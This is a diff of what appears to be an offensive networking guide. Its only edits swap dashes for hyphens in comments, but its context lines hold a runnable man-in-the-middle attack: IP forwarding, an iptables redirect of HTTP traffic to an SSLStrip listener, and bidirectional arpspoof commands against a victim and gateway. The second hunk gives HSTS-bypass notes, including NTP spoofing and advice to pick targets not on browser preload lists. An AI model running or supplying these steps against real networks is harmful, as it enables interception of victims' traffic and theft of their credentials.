@@ -100,7 +100,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # Set iptables redirect: HTTP traffic → SSLStrip listener
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
 
-# ARP spoof — pretend to be the gateway
+# ARP spoof - pretend to be the gateway
 arpspoof -i eth0 -t <target_ip> <gateway_ip>
 # In another terminal, reverse direction:
 arpspoof -i eth0 -t <gateway_ip> <target_ip>
@@ -222,7 +222,7 @@ Modern browsers enforce HSTS (HTTP Strict Transport Security) which prevents SSL
    - Requires NTP spoofing capability (delorean tool)
 
 3. **HSTS preload list domains:**
-   - Cannot be bypassed — Chrome, Firefox, Safari hardcode these
+   - Cannot be bypassed - Chrome, Firefox, Safari hardcode these
    - Google, Facebook, Twitter, PayPal etc. are preloaded
    - Focus on targets NOT in the preload list
 
